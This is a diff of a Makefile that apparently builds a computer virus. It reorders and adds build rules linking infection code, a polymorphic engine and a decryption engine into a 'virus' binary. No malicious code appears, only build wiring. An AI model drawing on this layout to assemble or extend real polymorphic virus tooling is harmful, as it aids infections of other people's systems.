@@ -46,20 +46,23 @@ all: virus polymake solopoly test
 polymake: polyengine.o polymorphicengine.o
 	$(GCC) $(LFLAGS) $^ -o $@
 	
-virus: infect.c polymorphic.c polymorphicengine.o  virus.o 
+virus: infect.c polymorphic.c  polymorphicengine.o  virus.o  decryptionegnine.o
 	$(CC) $(KFLAGS) $^ -o $@
 
-virus.o: virus.asm template.asm.inc
+virus.o: virus.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
 polyengine.o: polymake.cpp
 	$(GCC) $(CFLAGS) $< -o $@
 
-polymorphicengine.o: polymorphicengine.asm 
+decryptionegnine.o: decryptionengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
 
-decryptionengine.o: decryptionengine.asm 
+polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
+
+
+
 
 libobjdata.a: objsect.o objsym.o objcopy.o
 	ar rs libobjdata.a objsect.o objsym.o objcopy.o
